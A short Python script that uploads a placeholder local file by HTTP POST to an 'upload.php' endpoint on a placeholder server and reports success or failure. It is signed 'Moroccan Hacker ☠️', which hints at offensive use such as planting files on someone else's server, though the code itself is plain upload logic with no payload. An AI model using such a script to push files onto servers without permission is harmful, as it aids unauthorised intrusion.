import requests






server_domain = "http://your_server/" #your domain server



file_name = "file.ext"  #your target file
with open(file_name, "rb") as f:
    response = requests.post(server_domain + "upload.php", files={"file": (file_name, f)})

    if response.status_code == 200:
        print("File Uploaded Successfully")
    else:
        print("File not uploaded")

      
#Adam el khamsi ,Morocco , "Moroccan Hacker ☠️"
